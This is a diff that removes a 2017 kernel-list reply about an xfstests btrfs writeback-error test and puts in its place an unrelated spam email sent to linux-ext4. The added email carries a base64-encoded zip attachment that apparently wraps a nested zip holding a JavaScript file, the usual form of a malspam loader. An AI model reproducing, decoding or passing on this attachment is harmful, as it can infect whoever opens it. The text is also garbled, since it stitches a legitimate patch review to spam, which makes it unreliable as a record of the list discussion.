@@ -1,175 +1,104 @@
-From: Jeff Layton <jlayton@redhat.com>
-Subject: Re: [xfstests PATCH v4 5/5] btrfs: make a btrfs version of
- writeback error reporting test
-Date: Wed, 14 Jun 2017 07:55:17 -0400
-Message-ID: <1497441317.6752.2.camel@redhat.com>
-References: <20170612124213.14855-1-jlayton@redhat.com>
-         <20170612124213.14855-6-jlayton@redhat.com>
-         <20170613084034.GE4788@eguan.usersys.redhat.com>
+From: <board@gowoodlawn.com>
+Subject: (unknown)
+Date: Wed, 14 Jun 2017 12:27:45 -0000
+Message-ID: <149744326584.19456.10783140251260280850@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: 7bit
-Cc: Andrew Morton <akpm@linux-foundation.org>,
-        Al Viro <viro@ZenIV.linux.org.uk>, Jan Kara <jack@suse.cz>,
-        tytso@mit.edu, axboe@kernel.dk, mawilcox@microsoft.com,
-        ross.zwisler@linux.intel.com, corbet@lwn.net,
-        Chris Mason <clm@fb.com>, Josef Bacik <jbacik@fb.com>,
-        David Sterba <dsterba@suse.com>,
-        "Darrick J . Wong" <darrick.wong@oracle.com>,
-        David Howells <dhowells@redhat.com>,
-        linux-fsdevel@vger.kernel.org, linux-mm@kvack.org,
-        linux-ext4@vger.kernel.org, linux-xfs@vger.kernel.org,
-        linux-btrfs@vger.kernel.org, linux-block@vger.kernel.org
-To: Eryu Guan <eguan@redhat.com>
-Return-path: <linux-btrfs-owner@vger.kernel.org>
-In-Reply-To: <20170613084034.GE4788@eguan.usersys.redhat.com>
-Sender: linux-btrfs-owner@vger.kernel.org
-List-Id: linux-ext4.vger.kernel.org
+Content-Type: application/zip; name="2117876976.zip"
+Content-Transfer-Encoding: base64
+To: <linux-ext4@vger.kernel.org>
+Return-path: <linux-ext4-owner@vger.kernel.org>
+Received: from 111-253-147-221.dynamic-ip.hinet.net ([111.253.147.221]:50108
+        "HELO hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1752314AbdFNM1x (ORCPT
+        <rfc822;linux-ext4@vger.kernel.org>); Wed, 14 Jun 2017 08:27:53 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-ext4-owner@vger.kernel.org
+List-ID: <linux-ext4.vger.kernel.org>
 
-On Tue, 2017-06-13 at 16:40 +0800, Eryu Guan wrote:
-> On Mon, Jun 12, 2017 at 08:42:13AM -0400, Jeff Layton wrote:
-> > Make a new btrfs/999 test that works the way Chris Mason suggested:
-> > 
-> > Build a filesystem with 2 devices that stripes the data across
-> > both devices, but mirrors metadata across both. Then, make one
-> > of the devices fail and see how fsync is handled.
-> > 
-> > Signed-off-by: Jeff Layton <jlayton@redhat.com>
-> > ---
-> >  tests/btrfs/999   | 93 +++++++++++++++++++++++++++++++++++++++++++++++++++++++
-> 
-> Missing btrfs/999.out file
-> 
-> >  tests/btrfs/group |  1 +
-> >  2 files changed, 94 insertions(+)
-> >  create mode 100755 tests/btrfs/999
-> > 
-> > diff --git a/tests/btrfs/999 b/tests/btrfs/999
-> > new file mode 100755
-> > index 000000000000..84031cc0d913
-> > --- /dev/null
-> > +++ b/tests/btrfs/999
-> > @@ -0,0 +1,93 @@
-> > +#! /bin/bash
-> > +# FS QA Test No. 999
-> > +#
-> > +# Open a file several times, write to it, fsync on all fds and make sure that
-> > +# they all return 0. Change the device to start throwing errors. Write again
-> > +# on all fds and fsync on all fds. Ensure that we get errors on all of them.
-> > +# Then fsync on all one last time and verify that all return 0.
-> > +#
-> > +#-----------------------------------------------------------------------
-> > +# Copyright (c) 2017, Jeff Layton <jlayton@redhat.com>
-> > +#
-> > +# This program is free software; you can redistribute it and/or
-> > +# modify it under the terms of the GNU General Public License as
-> > +# published by the Free Software Foundation.
-> > +#
-> > +# This program is distributed in the hope that it would be useful,
-> > +# but WITHOUT ANY WARRANTY; without even the implied warranty of
-> > +# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-> > +# GNU General Public License for more details.
-> > +#
-> > +# You should have received a copy of the GNU General Public License
-> > +# along with this program; if not, write the Free Software Foundation,
-> > +# Inc.,  51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
-> > +#-----------------------------------------------------------------------
-> > +
-> > +seq=`basename $0`
-> > +seqres=$RESULT_DIR/$seq
-> > +echo "QA output created by $seq"
-> > +
-> > +here=`pwd`
-> > +tmp=/tmp/$$
-> > +status=1    # failure is the default!
-> > +trap "_cleanup; exit \$status" 0 1 2 3 15
-> > +
-> > +_cleanup()
-> > +{
-> > +    cd /
-> > +    rm -rf $tmp.* $testdir
-> > +    _dmerror_cleanup
-> > +}
-> > +
-> > +# get standard environment, filters and checks
-> > +. ./common/rc
-> > +. ./common/filter
-> > +. ./common/dmerror
-> > +
-> > +# real QA test starts here
-> > +_supported_os Linux
-> > +_require_dm_target error
-> > +_require_test_program fsync-err
-> > +_require_test_program dmerror
-> > +
-> > +# bring up dmerror device
-> > +_scratch_unmount
-> > +_dmerror_init
-> > +
-> > +# Replace first device with error-test device
-> > +old_SCRATCH_DEV=$SCRATCH_DEV
-> > +SCRATCH_DEV_POOL=`echo $SCRATCH_DEV_POOL | perl -pe "s#$SCRATCH_DEV#$DMERROR_DEV#"`
-> > +SCRATCH_DEV=$DMERROR_DEV
-> > +
-> > +_require_scratch
-> > +_require_scratch_dev_pool
-> 
-> Need "_require_scratch_dev_pool_equal_size" too, since test creates
-> raid1 profile for metadata.
-> 
-> Thanks,
-> Eryu
-> 
-
-Is this really needed?
-
-I've been running this test on btrfs with devices that are not of equal
-size, and it seems to work just fine. The test doesn't write a lot of
-data (just a few megs at most), so I don't think we'll run out of space
-unless you have some really small devices in there.
-
-> > +
-> > +rm -f $seqres.full
-> > +
-> > +echo "Format and mount"
-> > +
-> > +_scratch_pool_mkfs "-d raid0 -m raid1" > $seqres.full 2>&1
-> > +_scratch_mount
-> > +
-> > +# How much do we need to write? We need to hit all of the stripes. btrfs uses
-> > +# a fixed 64k stripesize, so write enough to hit each one
-> > +number_of_devices=`echo $SCRATCH_DEV_POOL | wc -w`
-> > +write_kb=$(($number_of_devices * 64))
-> > +_require_fs_space $SCRATCH_MNT $write_kb
-> > +
-> > +testfile=$SCRATCH_MNT/fsync-err-test
-> > +
-> > +SCRATCH_DEV=$old_SCRATCH_DEV
-> > +$here/src/fsync-err -b $(($write_kb * 1024)) -d $here/src/dmerror $testfile
-> > +
-> > +# success, all done
-> > +_dmerror_load_working_table
-> > +
-> > +# fs may be corrupt after this -- attempt to repair it
-> > +_repair_scratch_fs >> $seqres.full
-> > +
-> > +# remove dmerror device
-> > +_dmerror_cleanup
-> > +
-> > +status=0
-> > +exit
-> > diff --git a/tests/btrfs/group b/tests/btrfs/group
-> > index 6f19619e877c..8dbdfbfe29fd 100644
-> > --- a/tests/btrfs/group
-> > +++ b/tests/btrfs/group
-> > @@ -145,3 +145,4 @@
-> >  141 auto quick
-> >  142 auto quick
-> >  143 auto quick
-> > +999 auto quick
-> > -- 
-> > 2.13.0
-> > 
-
--- 
-Jeff Layton <jlayton@redhat.com>
+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
